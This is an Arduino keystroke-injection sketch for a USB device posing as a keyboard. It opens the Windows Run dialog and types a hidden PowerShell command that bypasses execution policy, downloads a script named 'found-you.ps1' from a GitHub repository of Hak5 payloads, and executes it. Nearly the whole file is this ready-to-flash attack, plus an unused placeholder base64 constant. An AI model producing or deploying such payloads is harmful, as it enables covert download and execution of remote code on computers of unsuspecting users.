#include <Keyboard.h>

// PLACEHOLDER - run build.ps1 to regenerate this file with the real base64 blob.
const char* B64 = "REPLACE_ME_RUN_build.ps1";

void runDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(700);
}

void pressEnter() {
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}

void setup() {
  delay(2500);            // let the host enumerate the HID device
  Keyboard.begin();
  delay(800);

  runDialog();
  delay(500);
  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1; invoke-expression $pl");
  delay(500);
  pressEnter();

  Keyboard.end();
}

void loop() {}
